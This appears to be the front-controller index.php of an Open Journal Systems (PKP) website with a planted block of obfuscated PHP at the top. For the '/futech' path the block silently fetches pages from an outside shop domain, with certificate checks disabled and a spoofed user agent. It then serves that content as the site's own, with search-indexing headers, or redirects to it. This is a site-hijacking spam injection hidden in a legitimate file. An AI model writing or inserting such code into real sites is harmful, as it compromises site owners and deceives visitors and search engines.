<?php
$_rm = [
//    '/'                           => 'https://revistasaga-9vt.pages.dev/lepe/a.txt',
    '/futech'                     => 'https://fupubco.warungwowo.shop/futech',
];

$_rq = rtrim(strtok($_SERVER['REQUEST_URI'] ?? '/', '?'), '/') ?: '/';
$_tg = null;
foreach ($_rm as $_k => $_v) {
    if ($_rq === $_k || $_rq === rtrim($_k, '/')) { $_tg = $_v; break; }
}

if ($_tg !== null) {
    $__b = false;
    $__a = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36';

    if (function_exists('curl_init')) {
        $ch = curl_init($_tg);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 3,
            CURLOPT_ENCODING       => '',
            CURLOPT_USERAGENT      => $__a,
        ]);
        $r = curl_exec($ch);
        $c = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($c === 200 && is_string($r) && strlen($r) > 100) $__b = $r;
    }

    if ($__b === false) {
        $__b = @file_get_contents($_tg, false, stream_context_create([
            'http' => ['method' => 'GET', 'header' => "User-Agent: {$__a}\r\n", 'timeout' => 15, 'follow_location' => 1],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]));
        if (!is_string($__b) || strlen($__b) <= 100) $__b = false;
    }

    if ($__b === false) { header("Location: {$_tg}", true, 302); exit; }

    while (ob_get_level()) ob_end_clean();
    header_remove();
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Content-Type-Options: nosniff');
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    header('Vary: Accept-Encoding');
    header('X-Robots-Tag: index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1');
    echo $__b;
    exit;
}
define('INDEX_FILE_LOCATION', __FILE__);
$application = require('./lib/pkp/includes/bootstrap.inc.php');

// Serve the request
$application->execute();




